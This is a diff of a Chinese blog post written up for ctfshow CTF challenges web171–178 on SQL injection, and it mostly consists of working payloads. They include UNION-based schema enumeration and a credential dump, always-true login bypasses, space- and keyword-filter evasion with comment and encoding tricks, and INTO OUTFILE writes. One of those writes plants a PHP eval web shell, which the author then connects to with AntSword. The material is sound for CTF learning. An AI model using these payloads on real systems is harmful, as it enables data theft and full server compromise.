@@ -6,32 +6,34 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="web171无过滤的字符型注入。   12345678910爆出有哪些位置可以进行输出数据 1&#x27; order by 3--+ 查看数据库名字 1&#x27; union select 1,2,database()--+ 爆破表名： -1&#x27; union select 1,2,group_concat(table_name) FROM information_schema.tabl">
+    <meta name="description" content="web171无过滤的字符型注入。无过滤的话，可以先用单引号逃逸出来，接着用or 1&#x3D;1 来永远符合条件，最后用注释防止limit的影响 payload:  1231’or 1&#x3D;1 --+1&#x27;or&#x27;1&#x27;&#x3D;&#x27;19999&#x27; or id &#x3D;&#x27;26  标准做法  本地调试把加号改成空格，URL编码过程中，空格通常会被转换为加号（+），因此我们传参可">
 <meta property="og:type" content="article">
 <meta property="og:title" content="web171-178">
 <meta property="og:url" content="https://youngking-gfy.github.io/2025/03/31/web171-178/index.html">
 <meta property="og:site_name" content="Youngking&#39;s Blog">
-<meta property="og:description" content="web171无过滤的字符型注入。   12345678910爆出有哪些位置可以进行输出数据 1&#x27; order by 3--+ 查看数据库名字 1&#x27; union select 1,2,database()--+ 爆破表名： -1&#x27; union select 1,2,group_concat(table_name) FROM information_schema.tabl">
+<meta property="og:description" content="web171无过滤的字符型注入。无过滤的话，可以先用单引号逃逸出来，接着用or 1&#x3D;1 来永远符合条件，最后用注释防止limit的影响 payload:  1231’or 1&#x3D;1 --+1&#x27;or&#x27;1&#x27;&#x3D;&#x27;19999&#x27; or id &#x3D;&#x27;26  标准做法  本地调试把加号改成空格，URL编码过程中，空格通常会被转换为加号（+），因此我们传参可">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/31/web171-178/file-20250331214257772.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/31/web171-178/file-20250331214336743.png">
-<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/31/web171-178/file-20250401120702033.png">
-<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/31/web171-178/file-20250401120738762.png">
-<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/31/web171-178/file-20250401121732133.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/31/web171-178/file-20250407125946431.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/31/web171-178/file-20250407130303094.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/31/web171-178/file-20250401122252058.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/31/web171-178/file-20250401122941657.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/31/web171-178/file-20250401123547777.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/31/web171-178/file-20250407132707124.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/31/web171-178/file-20250401130210172.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/31/web171-178/file-20250401130231221.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/31/web171-178/file-20250401130439834.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/31/web171-178/file-20250401130506117.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/31/web171-178/file-20250401130607705.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/31/web171-178/file-20250407133658323.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/31/web171-178/file-20250407133721772.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/31/web171-178/file-20250401131055945.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/31/web171-178/file-20250401131252303.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/31/web171-178/file-20250401131417799.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/31/web171-178/file-20250401131454209.png">
 <meta property="article:published_time" content="2025-03-31T04:32:32.000Z">
-<meta property="article:modified_time" content="2025-04-04T16:18:28.292Z">
+<meta property="article:modified_time" content="2025-04-07T05:40:30.527Z">
 <meta property="article:author" content="Y0ungK1ng">
 <meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary">
@@ -187,24 +189,36 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h3><p>无过滤的字符型注入。  </p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">爆出有哪些位置可以进行输出数据 </span><br><span class="line"><span class="number">1</span><span class="string">&#x27; order by 3--+ </span></span><br><span class="line"><span class="string">查看数据库名字 </span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database()<span class="comment">--+ </span></span><br><span class="line">爆破表名： </span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema=database()--+ </span></span><br><span class="line"><span class="string">爆破列名： </span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">FROM</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;ctfshow_user&#x27;</span><span class="comment">--+ </span></span><br><span class="line">爆破数据： </span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,group_concat(id,username,password) FROM ctfshow_user--+</span></span><br></pre></td></tr></table></figure>
-
+    <h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h3><p>无过滤的字符型注入。<br>无过滤的话，可以先用单引号逃逸出来，接着用<code>or 1=1</code> 来永远符合条件，最后用注释防止limit的影响</p>
 <p>payload: </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br><span class="line">9999&#x27; or id =&#x27;26</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1’or 1=1 --+</span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br><span class="line">9999&#x27; or id =&#x27;26</span><br></pre></td></tr></table></figure>
+
+<p>标准做法</p>
+<blockquote>
+<p>本地调试把加号改成空格，URL编码过程中，空格通常会被转换为加号（+），因此我们传参可以用加号</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">爆出有哪些位置可以进行输出数据 </span><br><span class="line"><span class="number">1</span><span class="string">&#x27; order by 3--+ </span></span><br><span class="line"><span class="string">查看数据库名字 </span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database()<span class="comment">--+ </span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> ctfshow_web</span><br><span class="line">爆破表名： </span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema=database()--+ </span></span><br><span class="line"><span class="string">// ctfshow_user</span></span><br><span class="line"><span class="string">爆破列名： </span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">FROM</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;ctfshow_user&#x27;</span><span class="comment">--+ </span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> id,username,password</span><br><span class="line">爆破数据： </span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,group_concat(id,username,password) FROM ctfshow_user--+</span></span><br></pre></td></tr></table></figure>
+
+
 
 
 <p>找到flag。<br><img src="/2025/03/31/web171-178/file-20250331214257772.png"></p>
 <p><img src="/2025/03/31/web171-178/file-20250331214336743.png"></p>
 <h3 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h3><p>开启容器</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">爆破表名 </span><br><span class="line">-1&#x27; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema=database()--+ </span><br><span class="line">爆破列名 </span><br><span class="line">-1&#x27; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name=&#x27;ctfshow_user2&#x27;--+ </span><br><span class="line">爆破flag </span><br><span class="line">-1&#x27; union select 1,2,group_concat(password) FROM ctfshow_user2 where username=&#x27;flag&#x27;--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>尝试上题payload失败<br><img src="/2025/03/31/web171-178/file-20250401120702033.png"></p>
-<p><img src="/2025/03/31/web171-178/file-20250401120738762.png"></p>
-<p>可以采用联合查询</p>
-<p><img src="/2025/03/31/web171-178/file-20250401121732133.png"></p>
-<h3 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h3><p>思路一：对查询数据做限定，因为已经知道了，在密码一栏中没有<code>flag</code>，就如同172最后</p>
+<p>尝试上题payload失败<br>因为直接<code>-1&#39; or 1=1 --+</code> flag字段会被过滤，<br>但是只要回显不输出username就可以绕过过滤</p>
+<p><img src="/2025/03/31/web171-178/file-20250407125946431.png"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">爆出有哪些位置可以进行输出数据 </span><br><span class="line"><span class="number">1</span><span class="string">&#x27; order by 2--+ </span></span><br><span class="line"><span class="string">爆破表名 </span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>,group_concat(table_name) <span class="keyword">FROM</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()<span class="comment">--+ </span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> ctfshow_user,ctfshow_user2</span><br><span class="line">爆破列名 </span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name=&#x27;</span>ctfshow_user2<span class="string">&#x27;--+ </span></span><br><span class="line"><span class="string">// id,username,password</span></span><br><span class="line"><span class="string">爆破flag </span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>,group_concat(password) <span class="keyword">FROM</span> ctfshow_user2 <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span><span class="comment">--+</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> ctfshow&#123;<span class="number">9</span>a6fd71f<span class="number">-2</span>bb6<span class="number">-417</span>f<span class="operator">-</span>b46f<span class="operator">-</span>a1c906476499&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="/2025/03/31/web171-178/file-20250407130303094.png"></p>
+<h3 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h3><p>这次将所有回显过滤flag，直接编码绕过或者如上题只显示password列即可，但其他题目中肯定不起作用</p>
+<p>mysql中用<code>to_base64</code></p>
+<p>首先确认是三列</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 3--+ </span></span><br></pre></td></tr></table></figure>
+
+<p>思路一：对查询数据做限定，因为已经知道了，在密码一栏中没有<code>flag</code>，就如同172最后</p>
 <p><code>1&#39; union select 1,2,group_concat(&#39;+&#39;,password) from ctfshow_user3 where username=&#39;flag&#39;--+</code></p>
-<p>思路2：编码绕过,base64，hex</p>
+<p>思路2：编码绕过,base64，hex都可以</p>
 <p><code>1&#39; union select 1,2,to_base64(password) from ctfshow_user3 where username=&#39;flag&#39;--+</code><br><code>-1&#39; union select 1,to_base64(username),hex(password) from ctfshow_user3 --+</code></p>
 <p><img src="/2025/03/31/web171-178/file-20250401122252058.png"></p>
 <h3 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#x27;/flag|[0-9]/i&#x27;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
@@ -218,6 +232,8 @@
 <p>将数据输出到一个文件中，然后访问对应文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select  username,password from ctfshow_user5 into outfile &quot;/var/www/html/1.txt&quot;--+</span><br></pre></td></tr></table></figure>
 
+<p><img src="/2025/03/31/web171-178/file-20250407132707124.png"></p>
+<p>还可以直接传入一句话木马</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,&quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/1.php</span><br><span class="line">-1&#x27; union select 1,from_base64(&quot;%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4d%56%30%70%4f%7a%38%2b&quot;) into outfile &#x27;/var/www/html/1.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
@@ -227,12 +243,15 @@
 <p><img src="/2025/03/31/web171-178/file-20250401130506117.png"><br>连接蚁剑</p>
 <p><img src="/2025/03/31/web171-178/file-20250401130607705.png"></p>
 <h3 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h3><p>万能密码直接查到<br><code>-1&#39; or username=&#39;flag</code></p>
-<h3 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h3><h4 id="解法一：万能密码"><a href="#解法一：万能密码" class="headerlink" title="解法一：万能密码"></a>解法一：万能密码</h4><p><code>1&#39;or/**/1=1%23</code></p>
+<p><code>1&#39; or 1=1--+</code>也没被过滤</p>
+<h3 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h3><p>空格被过滤，就相当于把注释符<code>-- </code>给过滤掉<br>用<code>/**/</code>或者是<code>%0a</code>（回车）或者<code>%09</code>（tab）来绕过空格的过滤，<code>%23</code>（#）来绕过注释符的过滤</p>
+<h4 id="解法一：万能密码"><a href="#解法一：万能密码" class="headerlink" title="解法一：万能密码"></a>解法一：万能密码</h4><p><code>1&#39;or/**/1=1%23</code></p>
 <p><code>/**/绕过空格</code></p>
+<p><img src="/2025/03/31/web171-178/file-20250407133658323.png"><br><img src="/2025/03/31/web171-178/file-20250407133721772.png"></p>
 <h4 id="解法二：正常查询"><a href="#解法二：正常查询" class="headerlink" title="解法二：正常查询"></a>解法二：正常查询</h4><p><code>1&#39;/**/union/**/select/**/1,2,password/**/from/**/ctfshow_user/**/where/**/username=&#39;flag&#39;%23</code></p>
 <p><img src="/2025/03/31/web171-178/file-20250401131055945.png"></p>
 <p><img src="/2025/03/31/web171-178/file-20250401131252303.png"></p>
-<h3 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h3><p>过滤了空格与<code>*</code>号等用<code>%09</code>绕过<br>id&#x3D;1’or’1’&#x3D;’1’%23</p>
+<h3 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h3><p>过滤了空格与<code>*</code>号等用<code>%09</code>（tab）、<code>%0a</code>（回车）绕过<br>id&#x3D;1’or’1’&#x3D;’1’%23</p>
 <p><img src="/2025/03/31/web171-178/file-20250401131417799.png"></p>
 <p>payload: <code>1&#39;%09union%09select%091,2,(select%09password%09from%09ctfshow_user%09where%09username%09=%09&#39;flag&#39;)%09%23</code></p>
 <p><img src="/2025/03/31/web171-178/file-20250401131454209.png"></p>
